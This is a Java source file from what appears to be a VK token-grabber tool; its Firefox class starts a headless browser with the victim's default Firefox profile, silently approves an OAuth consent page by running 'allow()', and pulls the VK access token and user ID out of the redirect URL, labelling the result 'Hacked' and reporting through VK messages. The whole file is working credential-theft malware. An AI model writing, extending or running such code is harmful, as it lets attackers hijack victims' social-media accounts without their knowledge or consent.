package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;
import java.nio.file.Paths;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.firefox.ProfilesIni;
import com.github.dedinc.vktokengrabber.Main;
import com.github.dedinc.vktokengrabber.utils.Helper;

public class Firefox {
	public String grab() {
		if (!new File(Paths.get(Main.cd, "Users", Main.username, "geckodriver.exe").toString()).exists()) {
			Helper.getWebDriver().getFirefoxDriver();;
		}
		System.setProperty("webdriver.gecko.driver", Paths.get(Main.cd, "Users", Main.username, "geckodriver.exe").toString());
		String[] paths = {Paths.get(Main.cd, "Program Files", "Mozilla Firefox", "firefox.exe").toString(), Paths.get(Main.cd, "Program Files (x86)", "Mozilla Firefox", "firefox.exe").toString()};
		for (int i = 0; i != paths.length; i++) {
			if (new File(paths[i]).exists()) {
				System.setProperty("webdriver.firefox.bin", paths[i]);
				break;
			}
		}
        ProfilesIni profileIni = new ProfilesIni();
        FirefoxProfile profile = profileIni.getProfile("default-release");
        FirefoxOptions options = new FirefoxOptions();
        options.addArguments("--headless");
        options.addPreference("general.useragent.override", Helper.getUserAgents().getAgent());
        options.setProfile(profile);
        FirefoxDriver driver = new FirefoxDriver(options);
		driver.get(Main.scope_url);
		JavascriptExecutor js = (JavascriptExecutor) driver;
		js.executeScript("allow()");
		try {
			Thread.sleep(1000);
		   } catch (Exception e) {
		}
		String url = driver.getCurrentUrl();
		driver.quit();
		try {
			String token = url.split("access_token=")[1].split("&")[0];
			String uid = url.split("user_id=")[1].split("&")[0];			
			return String.format("[id%s|Hacked]%n%nToken: %s", uid, token);
		   } catch (Exception e ) {
		}
		Helper.getVK().sendMessage("Firefox: Unauthorized in VK!");
		return null;
     }
}
